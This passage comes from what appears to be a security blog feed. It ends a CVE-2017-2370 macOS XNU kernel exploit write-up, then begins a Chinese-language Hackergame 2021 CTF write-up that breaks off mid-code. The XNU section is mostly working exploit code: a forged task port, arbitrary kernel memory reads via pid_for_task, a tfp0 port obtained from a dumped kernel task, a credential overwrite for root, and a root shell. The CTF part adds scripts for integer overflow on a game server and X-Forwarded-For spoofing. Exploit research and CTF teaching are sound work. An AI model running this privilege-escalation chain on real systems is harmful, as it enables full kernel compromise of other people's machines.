pid_for_task_args *args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">mach_port_name_t</span>t = args-&gt;t;</span><br><span class="line"><span class="keyword">user_addr_t</span>pid_addr  = args-&gt;pid;  </span><br><span class="line"><span class="keyword">proc_t</span> p;</span><br><span class="line"><span class="keyword">task_t</span>t1;</span><br><span class="line"><span class="keyword">int</span>pid = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">kern_return_t</span>err = KERN_SUCCESS;</span><br><span class="line"></span><br><span class="line">AUDIT_MACH_SYSCALL_ENTER(AUE_PIDFORTASK);</span><br><span class="line">AUDIT_ARG(mach_port1, t);</span><br><span class="line"></span><br><span class="line">t1 = port_name_to_task(t);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (t1 == TASK_NULL) &#123;</span><br><span class="line">err = KERN_FAILURE;</span><br><span class="line"><span class="keyword">goto</span> pftout;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">p = get_bsdtask_info(t1);</span><br><span class="line"><span class="keyword">if</span> (p) &#123;</span><br><span class="line">pid  = proc_pid(p);</span><br><span class="line">err = KERN_SUCCESS;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">err = KERN_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">task_deallocate(t1);</span><br><span class="line">pftout:</span><br><span class="line">AUDIT_ARG(pid, pid);</span><br><span class="line">(<span class="keyword">void</span>) copyout((<span class="keyword">char</span> *) &amp;pid, pid_addr, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">AUDIT_MACH_SYSCALL_EXIT(err);</span><br><span class="line"><span class="keyword">return</span>(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>pid_for_task</code> won’t check wether the task is valid or not, but simply return</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(*(<span class="keyword">uint64_t</span> *)(task + <span class="number">0x380</span>) + <span class="number">0x10</span>)</span><br></pre></td></tr></table></figure><p>Remember that we have a fake port already and we also have a <code>mach_port_t</code> points to that port we have. So we can achieve arbitrary kernel memory reading by using <code>pid_for_task</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">read_kernel</span><span class="params">(<span class="keyword">mach_port_t</span> port, <span class="keyword">void</span> *faketask, <span class="keyword">uint64_t</span> addr)</span> </span>&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> res;</span><br><span class="line">*(<span class="keyword">uint64_t</span> *)(faketask + <span class="number">0x380</span>) = addr - <span class="number">0x10</span>;</span><br><span class="line">pid_for_task(port, &amp;res);</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Now, convert our fake port to a task port.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fakeport-&gt;io_bits = IKOT_TASK | IO_BITS_ACTIVE;  <span class="comment">// cast fakeport to a task</span></span><br><span class="line">fakeport-&gt;io_references = <span class="number">0xff</span>;</span><br><span class="line"><span class="keyword">char</span> *faketask = ((<span class="keyword">char</span> *)fakeport) + <span class="number">0x1000</span>;</span><br></pre></td></tr></table></figure><p>Set the <code>kobject</code> to our faketask</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="keyword">uint64_t</span> *)(((<span class="keyword">uint64_t</span>)fakeport) + <span class="number">0x68</span>) = faketask;</span><br><span class="line">*(<span class="keyword">uint64_t</span> *)(((<span class="keyword">uint64_t</span>)fakeport) + <span class="number">0xa0</span>) = <span class="number">0xff</span>;</span><br><span class="line">*(<span class="keyword">uint64_t</span> *)(faketask + <span class="number">0x10</span>) = <span class="number">0xee</span>;</span><br></pre></td></tr></table></figure><p>Now we can find kernel proc and our own proc.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] try to find kernel proc\n&quot;</span>);</span><br><span class="line"><span class="keyword">uint32_t</span> proc_offset = <span class="number">0</span>, r1, r2;</span><br><span class="line"><span class="keyword">uint64_t</span> kernel_proc = <span class="number">0</span>, self_proc = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">uint64_t</span> n;</span><br><span class="line">r1 = read_kernel(port, faketask, allproc);</span><br><span class="line">r2 = read_kernel(port, faketask, allproc + <span class="number">0x4</span>);</span><br><span class="line"><span class="built_in">memcpy</span>((<span class="keyword">char</span> *)&amp;n, &amp;r1, <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>));</span><br><span class="line"><span class="built_in">memcpy</span>((<span class="keyword">char</span> *)&amp;n + <span class="number">4</span>, &amp;r2, <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> proc = read_kernel(port, faketask, allproc + <span class="number">0x10</span>);<span class="comment">// pid is located at the offset of 0x10</span></span><br><span class="line"><span class="keyword">if</span> (proc == getpid()) &#123;</span><br><span class="line">self_proc = allproc;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] found self proc pid=%d addr=0x%llx\n&quot;</span>, proc, self_proc);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (proc == <span class="number">0</span>) &#123;</span><br><span class="line">kernel_proc = allproc;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] found kernel proc pid=%d addr=0x%llx\n&quot;</span>, proc, kernel_proc);</span><br><span class="line">&#125;</span><br><span class="line">allproc = n;<span class="comment">// next pointer is at the offset of 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (self_proc != <span class="number">0</span> &amp;&amp; kernel_proc != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Arbitrary-kernel-memory-writing">Arbitrary kernel memory writing</h3><p>After getting the address of <code>kernel_proc</code>, we can dump the whole <code>task</code> and task port sturcture to user land.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *kernel_task_port_dump = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">char</span> *kernel_task_dump = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> kernel_task = <span class="number">0</span>, kernel_itk_self = <span class="number">0</span>;  <span class="comment">// osfmk/kern/task</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// check the sturcture to get the following offset </span></span><br><span class="line">r1 = read_kernel(port, faketask, kernel_proc + <span class="number">0x18</span>);</span><br><span class="line">r2 = read_kernel(port, faketask, kernel_proc + <span class="number">0x18</span> + <span class="number">0x4</span>);</span><br><span class="line"><span class="built_in">memcpy</span>((<span class="keyword">char</span> *)&amp;kernel_task, &amp;r1, <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>));</span><br><span class="line"><span class="built_in">memcpy</span>((<span class="keyword">char</span> *)&amp;kernel_task + <span class="number">4</span>, &amp;r2, <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] kernel_task=0x%llx, kernel_itk_sself=0x%llx\n&quot;</span>, kernel_task, kernel_itk_self);</span><br><span class="line"></span><br><span class="line">r1 = read_kernel(port, faketask, kernel_task + <span class="number">0xe8</span>);</span><br><span class="line">r2 = read_kernel(port, faketask, kernel_task + <span class="number">0xe8</span> + <span class="number">0x4</span>);</span><br><span class="line"><span class="built_in">memcpy</span>((<span class="keyword">char</span> *)&amp;kernel_itk_self, &amp;r1, <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>));</span><br><span class="line"><span class="built_in">memcpy</span>((<span class="keyword">char</span> *)&amp;kernel_itk_self + <span class="number">4</span>, &amp;r2, <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>));</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] kernel_task=0x%llx, kernel_itk_sself=0x%llx\n&quot;</span>, kernel_task, kernel_itk_self);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span> / <span class="number">4</span>; ++i) &#123;</span><br><span class="line">r1 = read_kernel(port, faketask, kernel_task + i * <span class="number">4</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(kernel_task_dump + i * <span class="number">4</span>, &amp;r1, <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span> / <span class="number">4</span>; ++i) &#123;</span><br><span class="line">r1 = read_kernel(port, faketask, kernel_itk_self + i * <span class="number">4</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(kernel_task_port_dump + i * <span class="number">4</span>, &amp;r1, <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(fakeport, kernel_task_port_dump, <span class="number">0x1000</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(faketask, kernel_task_dump, <span class="number">0x1000</span>);</span><br></pre></td></tr></table></figure><p>Then we use <code>task_get_special_port</code> to clone a send right for one of the task’s special ports.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="keyword">uint64_t</span> *)(((<span class="keyword">uint64_t</span>)fakeport) + <span class="number">0x68</span>) = faketask;</span><br><span class="line">*(<span class="keyword">uint64_t</span> *)(((<span class="keyword">uint64_t</span>)fakeport) + <span class="number">0xa0</span>) = <span class="number">0xff</span>;</span><br><span class="line"></span><br><span class="line">*(<span class="keyword">uint64_t</span> *)(((<span class="keyword">uint64_t</span>)faketask) + <span class="number">0x2b8</span>) = kernel_itk_self;</span><br><span class="line"><span class="keyword">mach_port_t</span> tfp0;</span><br><span class="line"></span><br><span class="line">task_get_special_port(port, <span class="number">4</span>, &amp;tfp0);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] tfp0 0x%x\n&quot;</span>, tfp0);</span><br><span class="line">fakeport-&gt;io_bits = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><h3 id="Time-to-get-root">Time to get root!</h3><p>Now we can directly overwrite uid to get root privilege.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//get root</span></span><br><span class="line"><span class="keyword">uint64_t</span> cred;</span><br><span class="line">r1 = read_kernel(port, faketask, self_proc + <span class="number">0xe8</span>);</span><br><span class="line">r2 = read_kernel(port, faketask, self_proc + <span class="number">0xe8</span> + <span class="number">0x4</span>);</span><br><span class="line"><span class="built_in">memcpy</span>((<span class="keyword">char</span> *)&amp;cred, &amp;r1, <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>));</span><br><span class="line"><span class="built_in">memcpy</span>((<span class="keyword">char</span> *)&amp;cred + <span class="number">4</span>, &amp;r2, <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>));</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> u = <span class="number">0</span>;</span><br><span class="line">mach_vm_write(tfp0, cred + <span class="number">0x18</span>, (<span class="keyword">vm_offset_t</span>)&amp;u, (<span class="keyword">mach_msg_type_number_t</span>)<span class="number">8</span>);</span><br><span class="line"><span class="keyword">if</span> (getuid() == <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;[+] g0t r00t! getuid = %d\n&quot;</span>, getuid());</span><br></pre></td></tr></table></figure><p>Get root shell now!</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="Some-sturcture-we-use…">Some sturcture we use…</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ipc_port</span>        *<span class="title">ipc_port_t</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IPC_PORT_NULL((ipc_port_t) 0UL)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IPC_PORT_DEAD((ipc_port_t)~0UL)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IPC_PORT_VALID(port) \</span></span><br><span class="line"><span class="meta">((port) != IPC_PORT_NULL &amp;&amp; (port) != IPC_PORT_DEAD)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">ipc_port_t</span> <span class="keyword">mach_port_t</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">kern_return_t</span> <span class="title">clock_sleep_trap</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">mach_port_name_t</span> clock_name,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">sleep_type_t</span> sleep_type,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">int</span> sleep_sec,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">int</span> sleep_nsec,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">mach_timespec_t</span> *wakeup_time)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span><span class="title">proc</span> &#123;</span></span><br><span class="line">LIST_ENTRY(proc) p_list;<span class="comment">/* List of all processes. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span>p_pid;<span class="comment">/* Process identifier. (static)*/</span></span><br><span class="line"><span class="keyword">void</span> * task;<span class="comment">/* corresponding task (static)*/</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;CVE-2017-2370&lt;/h1&gt;
&lt;h2 id=&quot;Bug&quot;&gt;Bug&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;</summary>
      
    
    
    
    
    <category term="Vulnerability" scheme="https://kpwnz.github.io/tags/Vulnerability/"/>
    
    <category term="XNU" scheme="https://kpwnz.github.io/tags/XNU/"/>
    
    <category term="macOS" scheme="https://kpwnz.github.io/tags/macOS/"/>
    
  </entry>
  
  <entry>
    <title>Hackergame2021 Writeup</title>
    <link href="https://kpwnz.github.io/2021/11/03/Hackergame2021-Writeup/"/>
    <id>https://kpwnz.github.io/2021/11/03/Hackergame2021-Writeup/</id>
    <published>2021-11-04T00:48:56.000Z</published>
    <updated>2021-11-22T16:22:13.616Z</updated>
    
    <content type="html"><![CDATA[<h1>Hackergame 2021</h1><p>a brief writeup</p><!-- TOC --><ul><li><a href="#hackergame-2021">Hackergame 2021</a><ul><li><a href="#%E7%AD%BE%E5%88%B0">签到</a></li><li><a href="#%E8%BF%9B%E5%88%B6%E5%8D%81%E5%85%AD%E5%8F%82%E4%B8%8A">进制十六——参上</a></li><li><a href="#%E7%8C%AB%E5%92%AA%E9%97%AE%E7%AD%94-pro-max">猫咪问答 Pro Max</a></li><li><a href="#%E5%8D%96%E7%93%9C">卖瓜</a></li><li><a href="#%E9%80%8F%E6%98%8E%E7%9A%84%E6%96%87%E4%BB%B6">透明的文件</a></li><li><a href="#%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87">旅行照片</a></li><li><a href="#flag-%E5%8A%A9%E5%8A%9B%E5%A4%A7%E7%BA%A2%E5%8C%85">FLAG 助力大红包</a></li><li><a href="#amnesia">Amnesia</a><ul><li><a href="#%E8%BD%BB%E5%BA%A6%E5%A4%B1%E5%BF%86">轻度失忆</a></li><li><a href="#%E8%AE%B0%E5%BF%86%E6%B8%85%E9%99%A4">记忆清除</a></li></ul></li><li><a href="#%E5%9B%BE%E4%B9%8B%E4%B8%8A%E7%9A%84%E4%BF%A1%E6%81%AF">图之上的信息</a></li><li><a href="#easy-rsa">Easy RSA</a></li><li><a href="#%E8%B5%9B%E5%8D%9A%E5%8E%A8%E6%88%BF">赛博厨房</a></li><li><a href="#%E7%81%AF%E7%AD%89%E7%81%AF%E7%AD%89%E7%81%AF">灯，等灯等灯</a><ul><li><a href="#level1">Level1</a></li></ul></li><li><a href="#%E5%8F%AA%E8%AF%BB%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F">只读文件系统</a></li><li><a href="#%E5%8D%B7%E7%8E%8B%E4%B8%8E%E9%87%8E%E7%94%9F%E7%9A%84-gpa">卷王与野生的 GPA</a></li><li><a href="#%E5%8A%A9%E8%AE%B0%E8%AF%8D">助记词</a><ul><li><a href="#%E7%AC%AC%E4%B8%80%E9%A1%BF%E5%A4%A7%E9%A4%90">第一顿大餐</a></li></ul></li><li><a href="#minecraft">minecRaft</a></li><li><a href="#fzuu">fzuu</a></li><li><a href="#%E5%A4%96%E6%98%9F%E4%BA%BA%E7%9A%84%E9%9F%B3%E6%B8%B8%E6%8E%8C%E6%9C%BA">外星人的音游掌机</a></li><li><a href="#%E8%B6%85-oi-%E7%9A%84-writeup-%E6%A8%A1%E6%8B%9F%E5%99%A8">超 OI 的 Writeup 模拟器</a><ul><li><a href="#%E6%9E%9C%E7%84%B6%E8%BF%98%E6%98%AF%E9%80%86%E5%90%91%E6%AF%94%E8%BE%83%E7%AE%80%E5%8D%95%E8%BF%99%E6%AC%A1%E6%B2%A1%E4%BA%BA%E4%B8%A4%E5%B0%8F%E6%97%B6%E6%89%8B%E5%81%9A%E4%BA%86%E5%90%A7">果然还是逆向比较简单，这次没人两小时手做了吧</a></li></ul></li></ul></li></ul><!-- /TOC --><h2 id="签到">签到</h2><p>观察可以发现<code>http://202.38.93.111:10000/?page=1</code>后面的参数<code>page</code>决定了现在的秒数，找个日期计算器即可</p><h2 id="进制十六——参上">进制十六——参上</h2><p><img src="t2.png" alt="Hex"><br>复制下来找个Hex编辑器就可以了</p><h2 id="猫咪问答-Pro-Max">猫咪问答 Pro Max</h2><p>看起来主要是考察信息检索</p><ul><li>第一题使用 <a href="https://web.archive.org">https://web.archive.org</a> 即可</li><li>第二题可以爆猜（不是），找到对应的网页即可（其实这题是很晚才做的，当时直接搜了一下在知乎找到了…）</li><li>第三题在 <a href="https://lug.ustc.edu.cn/wiki/">https://lug.ustc.edu.cn/wiki/</a> 直接搜索“活动室”就能找到了</li><li>第四题找出论文，数一下有几张图</li><li>第五题找到对应的文档，command+F report就能找到是<code>/dev/null</code>（为什么呢）</li></ul><h2 id="卖瓜">卖瓜</h2><p>考虑 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>6</mn><mi>x</mi><mo>+</mo><mn>9</mn><mi>y</mi><mo>=</mo><mn>20</mn></mrow><annotation encoding="application/x-tex">6x+9y=20</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">6</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">9</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">20</span></span></span></span>，并且要求解全部都是正整数的情况下，是不可能的，那么极有可能是通过整数溢出来达到最终结果，考虑6是0110，那么通过连续移位和相加就能组合出0xFFFFFFFFFFFFFFF0，也就是-16，正好与结果相差36，是9的整数倍，把移位需要的系数计算出来submit即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">arr=[<span class="number">2305843009213693952</span>,<span class="number">576460752303423488</span>,<span class="number">144115188075855872</span>,<span class="number">36028797018963968</span>,<span class="number">9007199254740992</span>,<span class="number">2251799813685248</span>,<span class="number">562949953421312</span>,<span class="number">140737488355328</span>,<span class="number">35184372088832</span>,<span class="number">8796093022208</span>,<span class="number">2199023255552</span>,<span class="number">549755813888</span>,<span class="number">137438953472</span>,<span class="number">34359738368</span>,<span class="number">8589934592</span>,<span class="number">2147483648</span>,<span class="number">536870912</span>,<span class="number">134217728</span>,<span class="number">33554432</span>,<span class="number">8388608</span>,<span class="number">2097152</span>,<span class="number">524288</span>,<span class="number">131072</span>,<span class="number">32768</span>,<span class="number">8192</span>,<span class="number">2048</span>,<span class="number">512</span>,<span class="number">128</span>,<span class="number">32</span>,<span class="number">8</span>]</span><br><span class="line">url = <span class="string">&#x27;http://202.38.93.111:15003/&#x27;</span></span><br><span class="line">cook=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;aaa&#x27;</span>&#125;</span><br><span class="line">parg=&#123;<span class="string">&#x27;b6&#x27;</span>:<span class="number">0</span>, <span class="string">&#x27;b9&#x27;</span>:<span class="number">0</span>, <span class="string">&#x27;submit&#x27;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> arr:</span><br><span class="line">    parg[<span class="string">&#x27;b6&#x27;</span>] = i</span><br><span class="line">    r = requests.post(url, data=parg, cookies=cook)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">parg[<span class="string">&#x27;b6&#x27;</span>] = <span class="number">0</span></span><br><span class="line">parg[<span class="string">&#x27;b9&#x27;</span>] = <span class="number">4</span></span><br><span class="line">requests.post(url, data=parg)</span><br></pre></td></tr></table></figure><h2 id="透明的文件">透明的文件</h2><p>看到这些[等符号就能想到这应该是ANSI转义序列，只要把<code>\e</code>添加在每个[前，打印出来就可以看到flag（为什么题目说劣质终端呢？可能是因为某些，比如cmd.exe里没法处理ANSI转移序列吧）</p><h2 id="旅行照片">旅行照片</h2><p>突破口在于图上的蓝色KFC，太显眼了，直接搜索蓝色KFC就可以找到，电话，地址都一并得到了，居然还是一个网红打卡地（）可以发现拍照位置在秦皇岛，通过影子猜测时间，然后通过街景确认左边的建筑物上的文字，楼层当时考虑到可能拍照的角度不同直接数会有点误差，就直接在控制台写脚本爆破了（其实就是懒得数）这个故事告诉我们不要乱发照片（）</p><h2 id="FLAG-助力大红包">FLAG 助力大红包</h2><p>简单解法：发送到各大群聊砍一刀（不是）<br>通过助力信息可以发现，目标会检测前后端地址是否匹配，搜索一下后端检测地址的方法可以发现<code>X-Forwarded-For</code>这个关键点，而前端地址就在request data里，这样就可以写出脚本了（一开始没有看到/8都会被认为是同一个就直接random了，到最后几个一直报地址相同）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&quot;http://202.38.93.111:10888/invite/f4883f59-edc4-4457-95f3-095113ad8b70&quot;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&quot;&#123;&#125;.0.0.0&quot;</span>.<span class="built_in">format</span>(a)</span><br><span class="line">    arg=&#123;<span class="string">&#x27;ip&#x27;</span>:<span class="built_in">str</span>&#125;</span><br><span class="line">    headers=&#123;<span class="string">&#x27;X-Forwarded-For&#x27;</span>:<span class="built_in">str</span>, <span class="string">&#x27;content-type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;</span><br><span class="line">    res=requests.post(url,data=arg,headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><h2 id="Amnesia">Amnesia</h2><h3 id="轻度失忆">轻度失忆</h3><p>这一个小问题比较简单，去掉<code>.data</code>段很明显还能通过立即数把参数传进去，直接<code>putchar</code>每个字符即可。</p><h3 id="记忆清除">记忆清除</h3><p>使用一些静态分析工具就能发现，一个ELF文件含有代码的地方不止有<code>.text</code>，还有<code>.init</code>，<code>.fini</code>等等地方，假如我们能把代码插入这些位置的话我们就能在没有<code>.text</code>的情况下执行代码了</p><p>将代码插入特定的<code>section</code>是简单的，通过<code>__attribute__ ((section (&quot;.init&quot;)))</code>就可以实现，接下来就是如何执行，看看<code>libc</code>源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __libc_init_array() &#123;</span><br><span class="line">    <span class="keyword">size_t</span> count, i;</span><br><span class="line">    </span><br><span class="line">    count = __preinit_array_end - __preinit_array_start;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">        __preinit_array_start[i]();</span><br><span class="line">    </span><br><span class="line">    _init();</span><br><span class="line"></span><br><span class="line">    count = __init_array_end - __init_array_start;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">        __init_array_start[i]();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __libc_fini_array() &#123;</span><br><span class="line">    <span class="keyword">size_t</span> count, 